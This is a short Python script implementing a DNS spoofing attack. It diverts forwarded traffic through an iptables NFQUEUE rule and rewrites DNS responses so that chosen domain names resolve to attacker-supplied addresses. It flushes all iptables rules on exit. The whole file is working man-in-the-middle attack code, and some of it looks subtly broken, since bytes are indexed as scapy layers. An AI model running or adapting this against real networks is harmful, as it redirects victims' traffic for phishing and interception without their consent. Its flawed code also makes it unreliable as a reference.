import os

from scapy.all import *
from netfilterqueue import NetfilterQueue

class DNSSpoofing:
	def __init__(self, hosts_list):
		self.hosts_list = hosts_list
		pass

	def run(self):
		QUEUE_NUM = 1
		os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
		queue = NetfilterQueue()

		try:
			print("spoofing run...")
			queue.bind(QUEUE_NUM, self._packet_handler)
			queue.run()
		except KeyboardInterrupt:
			print("stop spoofing")
			os.system("iptables --flush")

		pass

	def _packet_handler(self, packet):
		payload = packet.get_payload()
		tmp_packet = IP(payload)

		if tmp_packet.haslayer(DNSRR):
			try:
				tmp_packet = self._modificate_packet(bytes(tmp_packet))
			except IndexError:
				print("Error modificate packet #{} continue handle".format(tmp_packet))
				pass

			packet.set_payload(tmp_packet)
		
		packet.accept()
		pass

	def _modificate_packet(self, packet):
		query_name = packet[DNSQR].qname
		
		if query_name not in self.hosts_list:
			return packet

		response_data = self.hosts_list[query_name]
		packet[DNS].an = DNSRR(rrname = query_name, rdata = response_data)
		packet[DNS].ancount = 1

		del packet[IP].len
		del packet[IP].chksum
		del packet[UDP].len
		del packet[UDP].chksum

		return packet
